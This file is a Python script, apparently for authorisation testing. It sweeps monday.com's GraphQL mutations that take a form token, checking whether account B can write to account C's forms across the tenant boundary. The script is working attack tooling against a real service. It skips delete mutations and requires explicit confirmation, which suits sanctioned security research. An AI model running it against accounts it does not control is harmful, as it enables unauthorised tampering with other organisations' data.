#!/usr/bin/env python3
"""Sweep every mutation addressed by a formToken.

    export TOKEN_B=...  TOKEN_C=...
    export CONFIRM_WRITES=yes
    python3 probe_form_sweep.py

Why this surface and not the others.

Every earlier cross-tenant test came back "Couldn't find Board with id=..." or an
empty list. That is tenant-scoped lookup: C's object is not a candidate from B's
position, so there is no authorisation decision to get wrong.

`form(formToken:)` answered differently. It returned **User unauthorized to
perform action**, which means the resolver located C's form by its token across
the account boundary and then refused. The formToken namespace is global. The
defence that held everywhere else is not in this path, and an explicit check is
the only thing there.

That check is correct on `form`. This asks whether it is on all of them.

It matters because a form token is not a secret. Forms exist to be filled in by
people outside the account, and the token travels in the URL that gets shared.
Anyone holding a form link holds the token. So a form mutation missing the
owner check is reachable by every recipient of that link - not a theoretical
attacker who first has to guess 128 bits.

Method, per mutation taking a formToken:
    control   B's token, B's own form    proves the call shape works
    attack    B's token, C's form        the finding, if it succeeds

A control that fails makes the attack result meaningless, so it is reported and
the attack is marked unusable rather than counted as a pass.

Arguments and input objects are introspected, never guessed - guessing the input
shape is what wasted the previous run.

Skipped: anything named delete_*. Deleting a form object to test authorisation
destroys the evidence and, on a real account, someone's data.
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request

API = "https://api.monday.com/v2"
TOKEN_B = os.environ.get("TOKEN_B", "")
TOKEN_C = os.environ.get("TOKEN_C", "")
CONFIRM = os.environ.get("CONFIRM_WRITES", "") == "yes"

R, G, Y, B, D, N = "\033[31m", "\033[32m", "\033[33m", "\033[1m", "\033[2m", "\033[0m"
OUT = "form-sweep-out"


def post(token, query, pause=1.0):
    req = urllib.request.Request(
        API, data=json.dumps({"query": query}).encode(),
        headers={"Authorization": token, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            body = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    except Exception as e:
        body = json.dumps({"errors": [{"message": "transport: %s" % e}]})
    time.sleep(pause)
    return body


def save(name, obj):
    os.makedirs(OUT, exist_ok=True)
    with open(os.path.join(OUT, re.sub(r"[^\w.-]", "_", name)), "w") as fh:
        json.dump(obj, fh, indent=2)


def named(t):
    while t and not t.get("name"):
        t = t.get("ofType")
    return t or {}


def type_info(name, _cache={}):
    """Fields, inputFields and enumValues of a type."""
    if name in _cache:
        return _cache[name]
    q = ('{ __type(name: "%s") { kind '
         'fields { name type { name kind ofType { name kind ofType { name kind } } } } '
         'inputFields { name type { name kind ofType { name kind ofType { name kind } } } } '
         'enumValues { name } } }' % name)
    try:
        _cache[name] = json.loads(post(TOKEN_C, q, 0.3))["data"]["__type"] or {}
    except Exception:
        _cache[name] = {}
    return _cache[name]


def mutation_fields(_cache={}):
    if "m" in _cache:
        return _cache["m"]
    q = ('{ __type(name: "Mutation") { fields { name '
         'args { name type { name kind ofType { name kind ofType { name kind } } } } '
         'type { name kind ofType { name kind ofType { name kind } } } } } }')
    try:
        _cache["m"] = json.loads(post(TOKEN_C, q, 0.3))["data"]["__type"]["fields"]
    except Exception:
        _cache["m"] = []
    return _cache["m"]


SCALARS = {"String", "Int", "Float", "Boolean", "ID", "JSON", "ISO8601DateTime", "Date"}


def value_for(tname, kind, depth=0):
    """A syntactically valid literal for a type, introspecting input objects."""
    if kind == "ENUM" or (tname and type_info(tname).get("kind") == "ENUM"):
        vals = [v["name"] for v in (type_info(tname).get("enumValues") or [])]
        return vals[0] if vals else "null"
    if tname == "Boolean":
        return "true"
    if tname in ("Int", "Float"):
        return "1"
    if tname == "JSON":
        return '"{}"'
    if tname in ("String", "ID", "ISO8601DateTime", "Date"):
        return '"canary"'
    info = type_info(tname)
    if info.get("kind") == "INPUT_OBJECT" and depth < 2:
        parts = []
        for f in info.get("inputFields") or []:
            required = f["type"].get("kind") == "NON_NULL"
            inner = named(f["type"])
            if not required and inner.get("name") not in ("String", "Boolean"):
                continue
            parts.append("%s: %s" % (
                f["name"], value_for(inner.get("name"), inner.get("kind"), depth + 1)))
        return "{ %s }" % ", ".join(parts) if parts else "{}"
    return "null"


def selection(tname):
    info = type_info(tname)
    if info.get("kind") != "OBJECT":
        return ""
    picked = [f["name"] for f in (info.get("fields") or [])
              if named(f["type"]).get("name") in SCALARS]
    return "{ %s }" % " ".join(picked[:4]) if picked else "{ __typename }"


def build(spec, token_value):
    args = []
    for a in spec.get("args") or []:
        inner = named(a["type"])
        required = a["type"].get("kind") == "NON_NULL"
        if a["name"] in ("formToken", "token", "form_token"):
            args.append('%s: "%s"' % (a["name"], token_value))
        elif required or a["name"] == "input":
            args.append("%s: %s" % (
                a["name"], value_for(inner.get("name"), inner.get("kind"))))
    rt = named(spec["type"]).get("name")
    sel = "" if rt in SCALARS else selection(rt)
    return "mutation { %s(%s) %s }" % (spec["name"], ", ".join(args), sel)


def verdict(body):
    low = body.lower()
    if "is not defined by type" in low or "unknown argument" in low \
            or "cannot query field" in low or "is required on field" in low:
        return "SHAPE"          # never reached a resolver
    if '"errors"' in low:
        if any(k in low for k in ("unauthor", "permission", "forbidden", "not allowed",
                                  "not permitted", "access denied")):
            return "DENIED"
        if "not found" in low or "couldn't find" in low:
            return "NOTFOUND"
        return "ERROR"
    if '"data"' in low and not re.search(r'"data":\s*(null|\{\s*"\w+":\s*null\s*\})', body):
        return "OK"
    return "?"


COLOUR = {"OK": G, "DENIED": G, "NOTFOUND": G, "SHAPE": D, "ERROR": Y, "?": Y}


def make_form(token, label):
    ws = post(token, "{ workspaces(limit: 1) { id name } }")
    m = re.search(r'"id"\s*:\s*"?(\d+)"?', ws)
    if not m:
        print("  %s%s has no workspace%s" % (Y, label, N))
        return None
    q = ('mutation { create_form(destination_workspace_id: "%s", '
         'destination_name: "sweep-form-%s") { token } }' % (m.group(1), label))
    body = post(token, q)
    t = re.search(r'"token"\s*:\s*"([^"]+)"', body)
    if not t:
        print("  %s%s: create_form failed%s" % (Y, label, N))
        print("     %s%s%s" % (D, body[:220], N))
        return None
    print("  %s%s form token: %s%s" % (G, label, t.group(1), N))
    return t.group(1)


def main():
    if not TOKEN_B or not TOKEN_C:
        sys.exit("export TOKEN_B and TOKEN_C first")
    if not CONFIRM:
        print(__doc__)
        print("%sThis writes to forms on both accounts. Re-run with CONFIRM_WRITES=yes.%s"
              % (Y, N))
        return

    print("\n%s=== forms: a global token namespace with no tenant scoping ===%s\n"
          % (B, N))
    tb = make_form(TOKEN_B, "B")
    tc = make_form(TOKEN_C, "C")
    if not (tb and tc):
        print("\n%sNeed a form on both accounts. Nothing below would mean anything.%s"
              % (Y, N))
        return

    targets = [f for f in mutation_fields()
               if any(a["name"] in ("formToken", "token", "form_token")
                      for a in (f.get("args") or []))
               and not f["name"].startswith("delete_")]
    print("\n  %s%d mutations take a form token%s\n" % (D, len(targets), N))

    findings, unusable = [], []
    for spec in sorted(targets, key=lambda f: f["name"]):
        name = spec["name"]
        cq, aq = build(spec, tb), build(spec, tc)
        cb, ab = post(TOKEN_B, cq), post(TOKEN_B, aq)
        cv, av = verdict(cb), verdict(ab)
        save("%s.json" % name, {"control_query": cq, "control": cb,
                                "attack_query": aq, "attack": ab})

        line = "  %-32s control %s%-9s%s attack %s%-9s%s" % (
            name, COLOUR[cv], cv, N, COLOUR[av], av, N)
        if cv == "OK" and av == "OK":
            print(line + "  %s%s<-- B wrote to C's form%s" % (R, B, N))
            findings.append(name)
        elif cv != "OK" and av == "DENIED":
            # The two arms diverged: the attack was refused on ownership while the
            # control got past ownership and failed on the call shape. That only
            # happens if the ownership check runs before input validation, so the
            # denial is a real authorisation decision and this is a pass - a
            # stronger one than a matching pair of errors would have been.
            print(line + "  %sauth checked before input - genuine pass%s" % (G, N))
        elif cv != "OK":
            print(line + "  %scontrol failed - attack unusable%s" % (D, N))
            unusable.append((name, cv))
        else:
            print(line)
        if cv == "SHAPE" or av == "SHAPE":
            try:
                msg = json.loads(cb if cv == "SHAPE" else ab)["errors"][0]["message"]
                print("     %s%s%s" % (D, msg[:110], N))
            except Exception:
                pass

    print("\n%s--- result ---%s" % (B, N))
    if findings:
        print("  %s%sB modified C's form through: %s%s" % (R, B, ", ".join(findings), N))
        print("""
  This is the one that is worth writing up, and the impact argument is the point:
  a form token is not a secret. It is in the URL of every published form, so the
  people who can do this are everyone the form was ever shared with - not an
  attacker who has to guess 128 bits.

  Confirm the effect from account C's side before reporting. A mutation
  returning data is not proof the form changed. Then capture both request_ids.""")
    else:
        print("  %sNo form mutation crossed the boundary.%s" % (G, N))
    if unusable:
        print("\n  %sControls that did not work, so their attack arm proves nothing:%s"
              % (Y, N))
        for name, why in unusable:
            print("    %-32s %s" % (name, why))
        print("  %sSHAPE means the call was rejected before reaching a resolver -"
              "\n  read %s/<name>.json for the argument it actually wants.%s"
              % (D, OUT, N))


if __name__ == "__main__":
    main()
